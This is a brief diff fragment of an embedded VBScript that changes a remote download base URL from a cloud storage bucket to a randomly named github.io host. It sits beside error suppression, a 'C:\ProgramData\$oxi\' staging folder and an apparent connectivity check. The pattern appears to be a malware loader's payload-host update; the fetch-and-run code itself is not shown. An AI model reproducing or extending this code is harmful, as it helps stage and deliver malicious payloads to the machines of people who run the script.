@@ -11,7 +11,7 @@
 	<script language="VBScript">
 		<![CDATA[
 			On Error Resume Next
-			mUrl = "https://f000.backblazeb2.com/file/ggggggg/"
+			mUrl = "https://zxzxzx123321zxzxzx123321.github.io/"
 			mDir = "C:\ProgramData\$oxi\"
 			
 			AAA1 = "http://www.google.com/favicon.ico"
